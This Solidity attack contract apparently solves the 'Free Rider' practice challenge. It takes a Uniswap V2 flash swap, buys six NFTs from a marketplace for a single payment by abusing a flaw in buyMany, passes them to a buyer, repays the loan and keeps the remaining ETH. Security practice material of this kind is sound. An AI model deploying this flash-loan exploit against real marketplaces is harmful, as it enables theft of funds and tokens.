pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function token0() external returns (address);

    function token1() external returns (address);
}

interface IWETH {
    function balanceOf(address account) external returns (uint256);

    function deposit() external payable;

    function transfer(address recipient, uint256 amount) external;

    function withdraw(uint256 wad) external;
}

contract FreeRiderAttacker is IERC721Receiver {
    IMarketplace private immutable marketplace;
    IWETH private immutable weth;
    IERC721 private immutable nft;
    IUniswapV2Pair private immutable uniswapPair;
    address private immutable buyer;
    address private immutable owner;

    constructor(
        address _marketplace,
        address _weth,
        address _nft,
        address _uniswapPair,
        address _buyer
    ) {
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        buyer = _buyer;
        owner = msg.sender;
    }

    function attack() external {
        address token0 = uniswapPair.token0();
        address token1 = uniswapPair.token1();
        uint256 amount0Out;
        uint256 amount1Out;
        if (token0 == address(weth)) {
            amount0Out = 15 ether;
            amount1Out = 0;
        } else if (token1 == address(weth)) {
            amount0Out = 0;
            amount1Out = 15 ether;
        }
        bytes memory data = abi.encode(15 ether);
        uniswapPair.swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(
            msg.sender == address(uniswapPair),
            "FreeRiderAttacker: Not Uniswap"
        );
        require(sender == address(this), "FreeRiderAttacker: Not self");

        uint256 amount = amount0 > 0 ? amount0 : amount1;

        require(
            weth.balanceOf(address(this)) == amount,
            "FreeRiderAttacker: Insufficient WETH"
        );
        weth.withdraw(amount);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;
        marketplace.buyMany{value: amount}(tokenIds);

        nft.safeTransferFrom(address(this), buyer, 0);
        nft.safeTransferFrom(address(this), buyer, 1);
        nft.safeTransferFrom(address(this), buyer, 2);
        nft.safeTransferFrom(address(this), buyer, 3);
        nft.safeTransferFrom(address(this), buyer, 4);
        nft.safeTransferFrom(address(this), buyer, 5);

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 repayAmount = amount + fee;

        weth.deposit{value: repayAmount}();
        weth.transfer(address(uniswapPair), repayAmount);

        payable(owner).call{value: address(this).balance}("");
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
